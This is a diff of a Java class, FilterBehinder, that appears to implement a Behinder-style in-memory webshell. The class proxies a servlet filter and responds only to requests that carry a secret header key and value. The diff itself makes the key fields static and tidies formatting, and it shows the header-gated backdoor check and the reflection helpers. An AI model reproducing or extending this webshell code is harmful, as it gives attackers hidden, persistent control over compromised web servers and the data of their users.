@@ -21,8 +21,8 @@ import java.util.Map;
 @JavaClassModifiable({JavaClassModifiable.pass, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
 public class FilterBehinder implements InvocationHandler {
     private static String pass;
-    private String lockHeaderKey;
-    private String lockHeaderValue;
+    private static String lockHeaderKey;
+    private static String lockHeaderValue;
 
     public Object invoke(Object proxy, Method method, Object[] args) {
         if (method.getName().equals("doFilter")) {
@@ -34,7 +34,7 @@ public class FilterBehinder implements InvocationHandler {
     private void run(Object servletRequest, Object servletResponse, Object filterChain) {
         try {
             String lv = (String) invokeMethod(servletRequest, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
-            if(lv == null || !lv.contains(lockHeaderValue)) {
+            if (lv == null || !lv.contains(lockHeaderValue)) {
                 return;
             }
             String method = (String) invokeMethod(servletRequest, "getMethod", new Class[]{}, new Object[]{});
@@ -98,7 +98,7 @@ public class FilterBehinder implements InvocationHandler {
     public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
         try {
             return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
-        }catch (Exception e){
+        } catch (Exception e) {
             return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
         }
     }
